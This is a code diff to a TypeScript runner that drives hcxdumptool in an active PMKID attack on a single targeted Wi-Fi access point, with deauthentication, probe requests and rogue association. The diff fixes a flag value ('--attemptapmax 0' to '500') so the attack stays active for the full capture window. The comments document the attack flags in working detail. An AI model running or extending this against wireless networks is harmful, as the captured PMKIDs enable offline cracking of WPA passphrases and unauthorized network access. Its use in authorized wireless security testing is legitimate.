@@ -196,8 +196,14 @@ export class PmkidDriveRunner extends EventEmitter {
   //   -i iface       : manages its own monitor mode + channel + virtual MAC
   //   -c <N>a        : lock to the target channel ("a" = 2GHz band suffix)
   //   --bpf=<file>   : attack ONLY this AP (writeBpfForAp wrote it)
-  //   --attemptapmax : keep requesting the PMKID for the whole window
-  //                    (default 4 BEACONs ≈ 2s is way too short)
+  //   --attemptapmax : beacons that trigger a PMKID request before stopping.
+  //                    CAUTION: 0 does NOT mean "unlimited" — 0 DISABLES the
+  //                    whole active attack (deauth/proberequest/association
+  //                    all get switched off, verified in 6.3.5 --help), and
+  //                    hcxdumptool then sits passively for the whole window:
+  //                    every PMKID run reported "El AP no respondió". A large
+  //                    value keeps the AP attack alive for the full window
+  //                    (default 4 beacons ≈ 2s is also too short).
   //   --tot=<min>    : hard exit timer (ceil of the window, min 1 minute)
   //   --errormax=200 : tolerate malformed frames on a busy channel
   //   --rds=1        : status lines to stderr (parsed for [PMKID...] hits)
@@ -224,7 +230,10 @@ export class PmkidDriveRunner extends EventEmitter {
       "-w", "/dev/null",
       "-c", `${this.channel}a`,
       "--bpf", this.bpfFile,
-      "--attemptapmax", "0", // keep attacking this AP for the whole window
+      // Active AP attack (PMKID request via rogue association) for the
+      // whole window — NOT 0, which disables the attack entirely (see the
+      // flag comment above; that was the "El AP no respondió" bug).
+      "--attemptapmax", "500",
     ];
     if (exitOnEapol) args.push("--exitoneapol", "3");
     args.push(
